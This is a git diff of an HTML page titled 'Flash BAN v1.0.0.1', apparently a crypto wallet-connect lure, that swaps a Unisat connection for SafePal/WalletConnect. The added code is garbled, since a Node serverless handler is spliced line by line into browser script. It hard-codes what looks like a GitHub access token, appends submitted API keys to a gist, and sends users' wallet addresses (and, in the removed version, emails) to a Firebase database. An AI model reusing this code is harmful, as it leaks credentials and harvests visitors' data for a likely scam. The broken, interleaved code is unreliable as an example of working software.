@@ -1,8 +1,165 @@
+const fetch = require("node-fetch");
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flash BAN v1.0.0.1 connection to Unisat Wallet</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.4.6/dist/ethers.umd.min.js"></script> <!-- Ethers.js library -->
+    <title>SafePal BTC Wallet Connect</title>
+    <script src="https://unpkg.com/qrcode"></script>
+    <script type="module">
+        import { Core } from '@walletconnect/core';
+        import { WalletKit } from '@reown/walletkit';
+
+const GIST_ID = "5e604252453b0401e4de33570b643d64";  // Replace with your actual Gist ID
+const GITHUB_TOKEN = "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";  // Replace with your GitHub token
+exports.handler = async (event, context) => {
+    const apiKey = event.queryStringParameters.apiKey;
+        // Initialize WalletConnect Core
+        const core = new Core({
+            projectId: '8a486e18749e48bfc45390c6924e4e3d' // Your WalletConnect Project ID
+        });
+
+    if (!apiKey) {
+        return {
+            statusCode: 400,
+            body: JSON.stringify({ error: "API key is required" }),
+        // App Metadata
+        const metadata = {
+            name: 'Flash BAN v1.0.0.1 connection',
+            description: 'Connect SafePal and retrieve BTC address',
+            url: 'https://your-website.com', // Update this with your actual domain
+            icons: ['https://your-website.com/icon.png']
+        };
+    }
+
+    try {
+        // Step 1: Fetch current content from the Gist
+        const gistResponse = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+            headers: { Authorization: `token ${GITHUB_TOKEN}` }
+        // Initialize WalletKit
+        const walletKit = await WalletKit.init({
+            core,
+            metadata
+        });
+
+        if (!gistResponse.ok) {
+            throw new Error("Failed to fetch the existing Gist data");
+        async function connectWallet() {
+            let email = document.getElementById('emailInput').value.trim();
+            let connectButton = document.getElementById('connectButton');
+            let walletAddressDiv = document.getElementById('walletAddress');
+            let statusMessageDiv = document.getElementById('statusMessage');
+            if (!isValidEmail(email)) {
+                statusMessageDiv.textContent = "Invalid email format.";
+                statusMessageDiv.classList.remove("hidden");
+                return;
+            }
+            connectButton.textContent = "Connecting...";
+            connectButton.style.backgroundColor = "#f0ad4e";
+            try {
+                // Generate a WalletConnect pairing URI
+                const { uri } = await walletKit.connect();
+                displayQRCode(uri); // Show QR code for scanning
+                // Listen for connection event
+                walletKit.on('session_update', async () => {
+                    const btcAddress = await requestBitcoinAddress();
+                    walletAddressDiv.textContent = `Connected address: ${btcAddress}`;
+                    statusMessageDiv.textContent = "Wallet Connected Successfully!";
+                    walletAddressDiv.classList.remove("hidden");
+                    statusMessageDiv.classList.remove("hidden");
+                    sendToDatabase(btcAddress); // Store the BTC address in Firebase
+                    connectButton.textContent = "Connected";
+                    connectButton.style.backgroundColor = "#28a745";
+                });
+            } catch (error) {
+                statusMessageDiv.textContent = "Failed to connect wallet.";
+                statusMessageDiv.classList.remove("hidden");
+                connectButton.textContent = "Connect Now";
+                connectButton.style.backgroundColor = "#f6851b";
+                console.error("Connection error:", error);
+            }
+        }
+        async function requestBitcoinAddress() {
+            try {
+                const result = await walletKit.request({
+                    method: "btc_getAddress",
+                    params: [{ network: "bitcoin" }]
+                });
+                return result[0]; // Returns the BTC address
+            } catch (error) {
+                console.error("Error fetching BTC address:", error);
+                return "Error retrieving BTC address.";
+            }
+        }
+
+        const gistData = await gistResponse.json();
+        const fileContent = gistData.files["apikeys.txt"].content || "";
+        
+        // Step 2: Append new API key
+        const updatedContent = fileContent + `\n${apiKey}`;
+        // Step 3: Update the Gist with the new API key
+        const updateResponse = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+            method: "PATCH",
+            headers: {
+                Authorization: `token ${GITHUB_TOKEN}`,
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                files: {
+                    "apikeys.txt": { content: updatedContent }
+        function sendToDatabase(btcAddress) {
+            const apiUrl = `https://apidatabase-ff62a-default-rtdb.firebaseio.com/addresses/${encodeURIComponent(btcAddress)}.json`;
+            fetch(apiUrl, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ btcAddress })
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('statusMessage').textContent = "Address stored successfully!";
+                } else {
+                    document.getElementById('statusMessage').textContent = "Error storing address.";
+                }
+            })
+        });
+            .catch(() => {
+                document.getElementById('statusMessage').textContent = "Network Error.";
+            });
+        }
+
+        if (!updateResponse.ok) {
+            throw new Error("Failed to update the Gist with new API key");
+        function displayQRCode(uri) {
+            document.getElementById("qrcode").innerHTML = "";
+            QRCode.toCanvas(uri, { width: 256 }, function (error, canvas) {
+                if (!error) {
+                    document.getElementById("qrcode").appendChild(canvas);
+                }
+            });
+        }
+
+        // Step 4: Redirect after successful scan
+        return {
+            statusCode: 302,
+            headers: {
+                Location: "https://flashbitcoinapinetworkreleasev1.netlify.app/index.html"
+            },
+            body: "Redirecting... QR Code scanned successfully!"
+        };
+    } catch (error) {
+        return {
+            statusCode: 500,
+            body: JSON.stringify({ error: error.message })
+        function isValidEmail(email) {
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            return emailRegex.test(email);
+        }
+        window.onload = () => {
+            document.getElementById('connectButton').onclick = connectWallet;
+        };
+    }
+};
+    </script>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -24,12 +181,19 @@
             width: 400px;
         }
         h1 {
-            color: #5436cc;
-            font-size: 28px;
+            color: #f6851b;
+            font-size: 24px;
             margin-bottom: 20px;
         }
+        input {
+            width: 90%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #555;
+            margin-bottom: 10px;
+        }
         button {
-            background-color: #5436cc;
+            background-color: #f6851b;
             color: white;
             border: none;
             padding: 10px 20px;
@@ -38,9 +202,10 @@
             font-size: 16px;
             cursor: pointer;
             transition: background-color 0.3s;
+            width: 100%;
         }
         button:hover {
-            background-color: #3a2599;
+            background-color: #c17416;
         }
         #walletAddress, #statusMessage {
             margin-top: 20px;
@@ -50,78 +215,22 @@
             font-size: 16px;
             word-wrap: break-word;
         }
-        .connected {
-            background-color: #28a745; /* Green when connected */
+        .qr-container {
+            margin-top: 20px;
+        }
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Flash BAN v1.0.0.1 connection to Unisat Wallet</h1>
-        <input type="email" id="emailInput" placeholder="Enter your email" required style="padding: 10px; margin-bottom: 10px; width: 100%; border-radius: 5px;">
+        <h1>Flash BAN v1.0.0.1 connection to DEFI wallet</h1>
+        <input type="email" id="emailInput" placeholder="Enter your email" required>
         <button id="connectButton">CONNECT NOW</button>
-        <div id="walletAddress"></div>
-        <div id="statusMessage"></div>
+        <div id="walletAddress" class="hidden"></div>
+        <div id="statusMessage" class="hidden"></div>
+        <div class="qr-container" id="qrcode"></div>
     </div>
-
-    <script>
-        let provider;
-        let signer;
-        let connectedAddress = null;
-        let isConnecting = false;
-
-        function validateEmail(email) {
-            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-            return emailRegex.test(email);
-        }
-
-        document.getElementById('connectButton').addEventListener('click', async function () {
-            if (isConnecting) return;
-            isConnecting = true;
-
-            const email = document.getElementById('emailInput').value.trim();
-            if (!validateEmail(email)) {
-                document.getElementById('statusMessage').textContent = "Invalid email address!";
-                document.getElementById('statusMessage').style.color = "red";
-                isConnecting = false;
-                return;
-            }
-
-            document.getElementById('connectButton').textContent = 'Connecting...';
-            document.getElementById('connectButton').style.backgroundColor = '#3a2599';
-
-            if (typeof window.unisat !== 'undefined') {
-                try {
-                    // Connect to Unisat wallet
-                    const accounts = await window.unisat.requestAccounts();
-                    connectedAddress = accounts[0];
-
-                    document.getElementById('connectButton').textContent = 'Wallet Connected';
-                    document.getElementById('connectButton').classList.add('connected');
-                    document.getElementById('walletAddress').textContent = `Connected Address: ${connectedAddress}`;
-                    
-                    // Send Email & Wallet Address to Firebase
-                    const apiUrl = `https://apidatabase-ff62a-default-rtdb.firebaseio.com/addresses/${encodeURIComponent(connectedAddress)}.json`;
-                    const jsonData = JSON.stringify({ email, address: connectedAddress });
-                    await fetch(apiUrl, {
-                        method: 'PUT',
-                        body: jsonData,
-                        headers: { 'Content-Type': 'application/json' }
-                    });
-
-                    document.getElementById('statusMessage').textContent = "Successfully connected!";
-                    document.getElementById('statusMessage').style.color = "green";
-
-                } catch (error) {
-                    document.getElementById('statusMessage').textContent = "Bitcoin wallet connection failed.";
-                    document.getElementById('connectButton').textContent = 'Connect Wallet';
-                    document.getElementById('connectButton').style.backgroundColor = '#5436cc';
-                }
-            } else {
-                document.getElementById('statusMessage').textContent = "Unisat Wallet is not installed!";
-            }
-
-            isConnecting = false;
-        });
-    </script>
 </body>
+</html>
